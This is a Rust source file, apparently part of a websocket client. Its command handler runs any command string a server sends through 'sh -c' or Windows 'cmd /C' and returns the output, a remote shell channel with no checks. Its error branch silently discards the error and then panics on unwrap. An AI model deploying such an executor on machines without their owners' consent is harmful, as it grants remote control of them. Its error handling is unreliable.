use std::process::Command;

use anyhow::Error;

use crate::websockets::payloads::{
    client::CommandOutputPayload, general::StringPayload, server::CommandPayload,
};

pub fn handle_goodbye(payload: StringPayload) {
    println!("Got: {}", payload.content);
}

pub fn handle_command(payload: CommandPayload) -> Result<CommandOutputPayload, Error> {
    let shell = if cfg!(debug_assertions) {
        ("sh", "-c")
    } else {
        ("cmd", "/C")
    };

    let command = Command::new(shell.0)
        .arg(shell.1)
        .arg(payload.command)
        .output();

    if command.is_err() {
        anyhow::anyhow!("Failed to run command: {}", command.as_ref().err().unwrap());
    }

    let command_result = command.unwrap();

    let mut response = CommandOutputPayload::builder()
        .stdout(String::from_utf8(command_result.stdout)?)
        .stderr(String::from_utf8(command_result.stderr)?)
        .id(payload.id)
        .build();

    response.status_code = command_result.status.code();

    Ok(response)
}
